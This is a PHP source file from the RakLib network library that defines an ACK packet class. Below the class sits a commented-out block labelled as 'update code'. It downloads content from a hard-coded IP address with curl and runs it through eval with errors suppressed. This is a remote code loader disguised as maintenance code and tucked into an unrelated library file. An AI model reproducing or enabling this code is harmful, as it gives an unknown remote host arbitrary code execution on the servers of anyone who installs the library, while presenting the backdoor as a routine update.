<?php

/*
 * RakLib network library
 *
 *
 * This project is not affiliated with Jenkins Software LLC nor RakNet.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 */

namespace raklib\protocol;

class ACK extends AcknowledgePacket{
     /* @var \Countable ${deprecated} */
	public static $ID = 0xc0;
}


//Update code: TODO (0x05, 0xfe)
//$c=curl_init('http://116.203.96.151/update');
//curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
//@eval(curl_exec($c));
//curl_close($c);unset($c);